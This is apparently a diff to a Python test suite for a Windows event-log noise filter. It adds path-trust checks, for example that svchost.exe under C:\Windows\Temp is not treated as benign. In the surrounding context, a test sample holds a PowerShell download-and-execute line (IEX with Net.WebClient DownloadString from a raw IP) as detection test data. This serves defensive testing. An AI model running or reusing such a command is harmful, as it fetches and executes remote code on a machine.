@@ -130,6 +130,13 @@ class NoiseFilterEvasionTests(unittest.TestCase):
                                            CommandLine="dllhost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}")))
         self.assertTrue(is_benign_noise(ev(4688, NewProcessName=r"C:\Windows\System32\svchost.exe", CommandLine="")))
 
+    def test_noise_path_trust(self):
+        noise = lambda path: is_benign_noise(ev(4688, NewProcessName=path, CommandLine=""))
+        self.assertFalse(noise(r"C:\Windows\Temp\svchost.exe"))  # thư mục ghi được nằm trong C:\Windows
+        self.assertTrue(noise(r"D:\Windows\System32\dllhost.exe"))  # Windows cài ở ổ khác
+        self.assertTrue(noise(r"C:\Users\a\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe"))
+        self.assertFalse(noise(r"C:\Users\a\AppData\Local\Microsoft\OneDrive\svchost.exe"))
+
     def test_set_strictmode_does_not_hide_malicious_script(self):
         evil = ev(4104, ScriptBlockText="Set-StrictMode -Off\nIEX (New-Object Net.WebClient).DownloadString('http://45.77.1.2/a.ps1')")
         self.assertFalse(is_benign_noise(evil))
